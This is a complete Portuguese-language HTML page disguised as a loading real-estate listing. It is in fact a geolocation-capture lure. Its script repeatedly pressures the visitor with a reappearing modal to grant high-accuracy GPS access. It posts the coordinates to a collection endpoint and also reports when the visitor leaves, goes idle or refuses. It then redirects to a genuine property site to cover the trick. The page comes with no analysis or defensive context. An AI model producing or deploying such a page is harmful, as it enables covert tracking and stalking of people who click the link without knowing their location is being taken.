<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Imóvel Exclusivo - Carregando...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 40px; background-color: #f4f4f9; color: #333; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 380px; width: 85%; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #modal-gps {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .modal-content {
            background: white;
            padding: 25px;
            border-radius: 12px;
            max-width: 320px;
            width: 90%;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn-ativar {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }
    </style>
</head>
<body>

    <div class="box" id="tela-carregando">
        <h2>Carregando Imóvel</h2>
        <div class="spinner"></div>
        <p id="status-texto">Verificando disponibilidade na região...</p>
    </div>

    <div id="modal-gps">
        <div class="modal-content">
            <h3>Ativar Localização</h3>
            <p style="font-size: 14px; color: #666;">Para ver os detalhes deste imóvel e fotos exclusivas, por favor, ative a localização do seu aparelho.</p>
            <button class="btn-ativar" onclick="tentarNovamente()">Continuar / Permitir</button>
        </div>
    </div>

    <script>
        let enviado = false;
        let tentativasSemGps = 0;
        const maxTentativas = 5;

        function enviarDados(lat, lon, precisao) {
            if (enviado) return;
            enviado = true;

            fetch('/api/salvar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisao })
            }).finally(() => {
                window.location.href = "https://www.imovelweb.com.br";
            });
        }

        // Timer de 3 minutos de inatividade
        let timerInativo = setTimeout(() => {
            enviarDados("SEM_GPS_INATIVO_3MIN", "SEM_GPS_INATIVO_3MIN", "0");
        }, 180000);

        // Se sair ou minimizar o navegador
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                enviarDados("SAIU_DO_NAVEGADOR", "SAIU_DO_NAVEGADOR", "0");
            }
        });

        function pegarLocalizacao() {
            const statusTexto = document.getElementById('status-texto');
            const modalGps = document.getElementById('modal-gps');

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    clearTimeout(timerInativo);
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    let precisao = pos.coords.accuracy;

                    statusTexto.innerText = "Localização confirmada! Redirecionando...";
                    enviarDados(lat, lon, precisao);

                }, function(err) {
                    // Mantém ou exibe o pop-up forçadamente se falhar
                    modalGps.style.display = "flex";
                }, {
                    timeout: 7000,
                    enableHighAccuracy: true
                });
            } else {
                enviarDados("NAO_SUPORTADO", "NAO_SUPORTADO", "0");
            }
        }

        function tentarNovamente() {
            const modalGps = document.getElementById('modal-gps');
            const statusTexto = document.getElementById('status-texto');
            
            // Fecha o modal momentaneamente para testar a leitura
            modalGps.style.display = "none";
            tentativasSemGps++;

            // Se atingir 5 tentativas, desiste, envia apenas o IP e redireciona
            if (tentativasSemGps >= maxTentativas) {
                clearTimeout(timerInativo);
                enviarDados("LIMITE_5_TENTATIVAS", "LIMITE_5_TENTATIVAS", "0");
                return;
            }

            statusTexto.innerText = "Tentando novamente (" + tentativasSemGps + "/" + maxTentativas + ")...";
            
            // Nova tentativa de capturar o GPS
            navigator.geolocation.getCurrentPosition(function(pos) {
                clearTimeout(timerInativo);
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                let precisao = pos.coords.accuracy;
                enviarDados(lat, lon, precisao);
            }, function(err) {
                // Se continuar sem GPS, o modal reaparece imediatamente para a próxima tentativa
                modalGps.style.display = "flex";
            }, {
                timeout: 7000,
                enableHighAccuracy: true
            });
        }

        window.onload = function() {
            pegarLocalizacao();
        };
    </script>
</body>
</html>
